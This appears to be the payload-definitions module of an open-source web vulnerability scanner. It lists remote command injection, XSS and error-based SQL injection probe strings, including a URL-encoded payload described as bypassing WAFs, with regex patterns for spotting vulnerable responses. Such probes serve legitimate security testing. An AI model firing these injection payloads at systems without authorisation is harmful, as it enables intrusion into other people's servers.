# flake8: noqa

# Copyright (C) 2013 Ebrahim Hegazy
# Copyright (C) 2023 shadmod <info@shadmod.it>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.


# ANSI sequences
ANSI_GREEN = "\033[92m"
ANSI_BLUE = "\033[94m"
ANSI_BOLD = "\033[1m"
ANSI_RED = "\033[91m"
ANSI_END = "\033[0m"


HTTP_HEADER_SERVER = "Server"
HTTP_HEADER_SIG = "x-powered-by"

PAYLOADS_AND_CHECK = {
    "rce": {
        "payloads": [
            # remote code injection payloads
            ";${@print(md5(zigoo0))}",
            ';${@print(md5("zigoo0"))}',
            # bypass security filters & WAF's
            "%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B",
            # remote command execution payloads
            ";uname;",
            "&&dir",
            "&&type C:\\boot.ini",
            ";phpinfo();",
            ";phpinfo",
        ],
        "check": "51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot",
    },
    "xss": {
        "payloads": [
            "%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
            "%78%22%78%3e%78",
            "%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
            "zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
        ],
        "check": "zigoo0<svg|x>x",
    },
    "error-based-sqli": {
        "payloads": [
            "3'",
            "3%5c",
            "3%27%22%28%29",
            "3'><",
            "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27",
        ],
        "check": "Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error",
    },
}
